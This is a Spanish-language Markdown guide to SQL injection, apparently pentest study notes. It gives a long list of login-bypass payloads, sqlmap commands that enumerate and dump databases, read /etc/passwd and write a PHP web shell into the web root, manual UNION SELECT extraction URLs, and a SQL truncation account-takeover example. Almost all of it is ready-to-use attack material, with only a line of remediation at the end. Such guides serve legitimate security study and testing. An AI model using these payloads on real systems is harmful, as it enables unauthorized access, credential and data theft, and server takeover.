# 📚 Guía Básica de Inyección SQL (SQLi) Manual y Automatizada



---

## 📑 Índice

### 1. Introducción
- [❓ ¿Qué es una SQL Injection?](#quees)
- [📌 ¿Por qué ocurre?](#porqueocurre)

### 2. Conceptos Básicos
- [🔍 Ejemplo sencillo](#sencillo)
- [🔍 ¿Cómo detectar la vulnerabilidad?](#detectar)
- [📝 Inyecciones comunes (manuales)](#comunes)

### 3. Automatización con sqlmap
- [🤖 Automatizar el ataque](#automatizar)
  - [1️⃣ Buscar bases de datos](#buscar)
  - [2️⃣ Enumerar tablas](#tablas)
  - [3️⃣ Enumerar columnas](#columnas)
  - [4️⃣ Extraer datos](#extraer)
- [🎯 Ataques avanzados con sqlmap](#avanzadosqlmap)
  - [🔹 Especificar parámetro vulnerable](#especificarparametro)
  - [🔹 Aumentar nivel y riesgo](#nivel)
  - [🔹 Uso de cookies](#cookies)
  - [🔹 Obtener usuario actual](#usuarioactual)
  - [🔹 Obtener versión del motor](#version)
  - [🔹 Leer archivos](#leer)
  - [🔹 Escribir archivos (WebShell)](#escribir)

### 4. Guía de ataque manual (UNION SELECT)
- [🛠️ Paso 1️⃣ Detectar vulnerabilidad](#paso1)
- [🛠️ Paso 2️⃣ Identificar número de columnas](#paso2)
- [🛠️ Paso 3️⃣ Usar UNION SELECT](#paso3)
- [🛠️ Paso 4️⃣ Listar bases de datos](#paso5)
- [🛠️ Paso 5️⃣ Listar nombres de tablas](#paso6)
- [🛠️ Paso 6️⃣ Listar columnas](#paso7)
- [🛠️ Paso 7️⃣ Mostrar datos concatenados](#paso8)
- [✅ Notas importantes](#notasss)

### 5. Ataques específicos
- [🗂️ SQL Truncation Attack](#truncation1)
  - [¿Qué supone?](#truncation2)
  - [Ejemplo simple](#truncation3)
  - [Resumen y recomendaciones](#resumennn)

---


   

---
<a name="quees"></a>
## ❓ ¿Qué es una SQL Injection?

Una **SQL Injection** es un tipo de ataque que ocurre cuando un atacante es capaz de "inyectar" código SQL malicioso en una consulta que se envía a la base de datos.

👉 En otras palabras: el atacante logra manipular las consultas a la base de datos para que hagan cosas no deseadas, como:

- obtener datos confidenciales,
- modificar o eliminar datos,
- saltarse controles de autenticación,
- ejecutar comandos administrativos en la base de datos.

---
<a name="porqueocurre"></a>
## 📌 ¿Por qué ocurre?

Sucede cuando una aplicación web **no valida correctamente la entrada del usuario** antes de usarla en una consulta SQL.

---
<a name="sencillo"></a>
## 🔍 Ejemplo sencillo

Supongamos que en una página de login tenemos este código en PHP:

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

Si el atacante, en el campo `password`, escribe:

```sql
' OR '1'='1
```

La consulta que se ejecuta es:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```

Como `'1'='1'` siempre es verdadero, es posible que el atacante logre iniciar sesión **sin conocer la contraseña**.

---
<a name="detectar"></a>
## 🔍 ¿Cómo detectar la vulnerabilidad?

Cuando vemos campos a rellenar, intentaremos inyectar código y observaremos la respuesta.  
Lo primero es intentar **escapar del contexto actual** con entradas como:

```
[Nada]
'
"
`
')
")
`)
'))
"))
`))
```
Esto funciona como delimitadores o terminadores de cadenas o comandos en SQL y podremos inyectar una petición maliciosa posteriormente.
 
Podemos automatizar esta tarea con diccionarios como SecLists.

---
<a name="comunes"></a>
## Inyecciones comunes (manuales)

```sql
" or 1=1
" or 1=1#
" or 1=1--
" or 1=1/*
' or 1=1
' or 1=1#
' or 1=1--
' or 1=1/*
admin" #
admin" --
admin" or "1"="1
admin" or "1"="1"#
admin" or "1"="1"--
admin" or "1"="1"/*
admin" or 1=1
admin" or 1=1#
admin" or 1=1--
admin" or 1=1/*
admin") or "1"="1
admin") or "1"="1"#
admin") or "1"="1"--
admin") or "1"="1"/*
admin") or ("1"="1
admin") or ("1"="1"#
admin") or ("1"="1"--
admin") or ("1"="1"/*
admin"/*
admin"or 1=1 or ""="
admin' #
admin' --
admin' or '1'='1
admin' or '1'='1'#
admin' or '1'='1'--
admin' or '1'='1'/*
admin' or 1=1
admin' or 1=1#
admin' or 1=1--
admin' or 1=1/*
admin') or '1'='1
admin') or '1'='1'#
admin') or '1'='1'--
admin') or '1'='1'/*
admin') or ('1'='1
admin') or ('1'='1'#
admin') or ('1'='1'--
admin') or ('1'='1'/*
admin'/*
admin'or 1=1 or ''='
or 1=1
or 1=1#
or 1=1--
or 1=1/*
```

---
<a name="automatizar"></a>
## 🤖 Automatizar el ataque

Podemos automatizar el ataque con herramientas como `sqlmap`.
<a name="buscar"></a>
### 1️⃣ Buscar bases de datos

```bash
sqlmap -u http://<IP> --forms --dbs --batch
```
<a name="tablas"></a>
### 2️⃣ Enumerar las tablas

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> --tables --batch
```
<a name="columnas"></a>
### 3️⃣ Enumerar las columnas

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> --columns --batch
```
<a name="extraer"></a>
### 4️⃣ Extraer los datos

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> -C <NOMBRE_DE_LA_COLUMNA_1>,<NOMBRE_DE_LA_COLUMNA_2> --dump --batch
```

---
<a name="avanzadosqlmap"></a>
## 🎯 Ataques avanzados con SQLMap
<a name="especificarparametro"></a>
### 🔹 Especificar el parámetro vulnerable

```bash
sqlmap -u "http://<IP>/pagina.php?id=1" -p id --dbs --batch
```
<a name="nivel"></a>
### 🔹 Aumentar el nivel y riesgo del ataque

```bash
sqlmap -u http://<IP> --forms --dbs --risk=3 --level=5 --batch
```
<a name="cookies"></a>
### 🔹 Usar cookies

```bash
sqlmap -u http://<IP> --cookie="PHPSESSID=XXXXXXXXXXXXX" --dbs --batch
```
<a name="usuarioactual"></a>
### 🔹 Obtener el usuario actual

```bash
sqlmap -u http://<IP> --current-user --batch
```
<a name="version"></a>
### 🔹 Obtener versión del motor

```bash
sqlmap -u http://<IP> --banner --batch
```
<a name="leer"></a>
### 🔹 Leer archivos

```bash
sqlmap -u http://<IP> --file-read="/etc/passwd" --batch
```
<a name="escribir"></a>
### 🔹 Escribir archivos (WebShell)

```bash
sqlmap -u http://<IP> --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
```

---

## 🛠️ Guía de ataque manual (UNION SELECT)

---
<a name="paso1"></a>
## Paso 1️⃣ Detectar la vulnerabilidad

Inserta una comilla simple `'` en un parámetro de entrada (formulario, URL, etc.).

Ejemplo:

```
http://ejemplo.com/product.php?id=1'
```

O prueba con número negativo:

```
http://ejemplo.com/product.php?id=-1
```

---
<a name="paso2"></a>
## Paso 2️⃣ Identificar el número de columnas con ORDER BY

```bash
http://ejemplo.com/product.php?id=1 ORDER BY 1-- -
http://ejemplo.com/product.php?id=1 ORDER BY 2-- -
http://ejemplo.com/product.php?id=1 ORDER BY 3-- -
...
```

Cuando aparezca un error, el número anterior indica la cantidad correcta de columnas.

---
<a name="paso3"></a>
## Paso 3️⃣ Usar UNION SELECT para obtener datos

Ejemplo con 3 columnas:

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,2,3-- -
```

Si ves 1, 2, 3 en la página, la inyección funciona. Aunque solo apararezca uno de los números nos vale porque es en ese en el que inyectaremos la consulta.

---
---
<a name="paso5"></a>
## Paso 4️⃣ Listar bases de datos

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -
```

Con LIMIT:

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata LIMIT 0,1-- -
```

---
<a name="paso6"></a>
## Paso 5️⃣ Listar nombres de tablas

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="<NOMBRE_BASE_DATOS>"-- -
```

---
<a name="paso7"></a>
## Paso 6️⃣ Listar columnas

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="<NOMBRE_BASE_DATOS>" AND table_name="<NOMBRE_TABLA>"-- -
```

---
<a name="paso8"></a>
## Paso 7️⃣ Mostrar datos concatenados

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUMNA2>),3,4,5 FROM <NOMBRE_BASE_DATOS>.<NOMBRE_TABLA>-- -
```

(0x3a representa el carácter ":")

---
<a name="notasss"></a>
## ✅ Notas

- Adaptar el número de columnas a las de la consulta original.
- Usar `-- -` o `#` para comentar el resto de la consulta original.
- Hay veces que habrá que URLencodear las consultas.

---

<a name="truncation1"></a>
## 🗂️ SQL Truncation Attack 

El **SQL truncation** es una técnica que explota cómo algunas bases de datos o aplicaciones manejan cadenas de texto más largas de lo permitido por el esquema de la base de datos.
<a name="truncation2"></a>
### ¿Qué supone esto?

Supongamos que tenemos un panel de registro y conocemos un usuario administrador, por ejemplo:

```
admin
```

Vamos a intentar registrar un usuario así:

```
admin                               lala
```

Aquí viene el truco: si el campo `username` es `VARCHAR(8)` (es decir, máximo 8 caracteres), ocurre lo siguiente:

- Algunas bases de datos lo **recortan** automáticamente (truncamiento).
- Otras bases de datos dan **error**.

Si la aplicación no controla esto bien, puede causar:

- Fallos de autenticación.
- Saltarse restricciones de `UNIQUE`.
- Confusión en los registros.

👉 En este caso, la aplicación acaba **sobrescribiendo** al usuario `admin` con nuestra contraseña. Luego, tendremos acceso como el admin legítimo.

---
<a name="truncation3"></a>
## Ejemplo simple 📋

### Tabla de usuarios:

```sql
CREATE TABLE users (
    username VARCHAR(8) UNIQUE,
    password VARCHAR(100)
);
```

### 1️⃣ Usuario legítimo:

```sql
INSERT INTO users (username, password)
VALUES ('admin', 'securepass');
```

### 2️⃣ Atacante intenta crear:

```sql
INSERT INTO users (username, password)
VALUES ('admin             lala', 'hackedpass');
```

### Resultado:

- `'admin             lala'` se **trunca** a `'admin'`.
- Si `'admin'` no existía, se guarda.
- Si `'admin'` ya existía, puede:
  - Dar un **error** (violación de `UNIQUE`), o
  - **Sobrescribir** al usuario `admin`, dependiendo de cómo esté implementada la lógica de inserción (por ejemplo, si se hace `INSERT OR REPLACE` o `ON DUPLICATE KEY UPDATE`).

---


---
<a name="resumennn"></a>
## Resumen 📝

- SQL truncation es un ataque muy sencillo pero efectivo si el tamaño de los campos no está bien validado.
- Permite, en ciertos casos, **tomar control** de cuentas ya existentes.
- Es importante validar el tamaño del campo en la aplicación.
 
---










